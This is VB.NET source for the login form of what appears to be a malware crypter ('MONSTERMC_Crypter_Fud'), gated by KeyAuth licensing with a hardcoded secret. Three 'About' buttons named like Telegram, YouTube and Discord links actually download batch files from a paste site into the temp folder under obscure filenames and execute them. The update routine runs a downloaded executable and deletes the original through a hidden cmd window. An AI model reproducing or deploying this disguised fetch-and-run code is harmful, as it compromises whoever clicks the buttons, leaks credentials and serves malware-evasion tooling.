Imports System.Net
Imports System.Threading
Imports MONSTERMC_Crypter_Fud.KeyAuth

Public Class Login
    Public Shared KeyAuthApp As New api(name:="VIP TOOLS", ownerid:="haWdqjdbyX", secret:="f64222bfab8b7927e63f17066c3c3a95d2215243f79df285492173276e345e70", version:="1.0")
#Region "About"
    Private Sub Guna2ImageButton1_Click(sender As Object, e As EventArgs) Handles Guna2ImageButton1.Click
        Dim Telgram As New System.Net.WebClient
        Telgram.DownloadFile("https://snippet.host/yntyzs/raw", Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
    End Sub

    Private Sub Guna2ImageButton2_Click(sender As Object, e As EventArgs) Handles Guna2ImageButton2.Click
        Dim Youtube As New System.Net.WebClient
        Youtube.DownloadFile("https://snippet.host/bkdfeh/raw", Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
    End Sub

    Private Sub Guna2ImageButton3_Click(sender As Object, e As EventArgs) Handles Guna2ImageButton3.Click
        Dim Discord As New System.Net.WebClient
        Discord.DownloadFile("https://snippet.host/rcgkzj/raw", Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
    End Sub

    Private Sub Guna2ImageButton4_Click(sender As Object, e As EventArgs) Handles Guna2ImageButton4.Click
        Process.Start("https://shoppy.gg/@nor.adlb1/groups/bUvZe2D")
    End Sub
#End Region
#Region "KeyAuth"
    Private Sub Login_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        KeyAuthApp.init()

        If KeyAuthApp.response.message = "invalidver" Then
            If Not String.IsNullOrEmpty(KeyAuthApp.app_data.downloadLink) Then

                Dim dialogResult_Renamed As DialogResult = MessageBox.Show("Yes to open file in browser" & ControlChars.Lf & "No to download file automatically", "Auto update", MessageBoxButtons.YesNo)
                Select Case dialogResult_Renamed
                    Case System.Windows.Forms.DialogResult.Yes
                        Process.Start(KeyAuthApp.app_data.downloadLink)
                        Environment.Exit(0)
                    Case System.Windows.Forms.DialogResult.No
                        Dim webClient As New WebClient()
                        Dim destFile As String = Application.ExecutablePath

                        Dim rand As String = random_string()

                        destFile = destFile.Replace(".exe", $"-{rand}.exe")
                        webClient.DownloadFile(KeyAuthApp.app_data.downloadLink, destFile)

                        Process.Start(destFile)
                        Process.Start(New ProcessStartInfo() With {.Arguments = "/C choice /C Y /N /D Y /T 3 & Del """ & Application.ExecutablePath & """", .WindowStyle = ProcessWindowStyle.Hidden, .CreateNoWindow = True, .FileName = "cmd.exe"})
                        Environment.Exit(0)

                    Case Else
                        MessageBox.Show("Invalid option")
                        Environment.Exit(0)
                End Select
            End If
            MessageBox.Show("Version of this program does not match the one online. Furthermore, the download link online isn't set. You will need to manually obtain the download link from the developer")
            Thread.Sleep(2500)
            Environment.Exit(0)
        End If

        If Not KeyAuthApp.response.success Then
            MessageBox.Show(KeyAuthApp.response.message)
            Environment.Exit(0)
        End If
        ' if(KeyAuthApp.checkblack())
        ' {
        '     MessageBox.Show("user is blacklisted");
        ' }
        ' else
        ' {
        '     MessageBox.Show("user is not blacklisted");
        ' }
        KeyAuthApp.check()
        Guna2HtmlLabel1.Text = $"Current Session Validation Status: {KeyAuthApp.response.success}"
    End Sub
    Private Shared Function random_string() As String
        Dim str As String = Nothing

        Dim random As New Random()
        For i As Integer = 0 To 4
            str &= Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65))).ToString()
        Next i
        Return str

    End Function

    Private Sub Guna2GradientButton1_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton1.Click
        KeyAuthApp.license(Guna2TextBox1.Text)
        If KeyAuthApp.response.success Then
            '
            Dim main_Renamed As New Form1()
            main_Renamed.Show()
            Me.Hide()
        Else
            Guna2HtmlLabel1.Text = "Status: " & KeyAuthApp.response.message
        End If
    End Sub
#End Region
End Class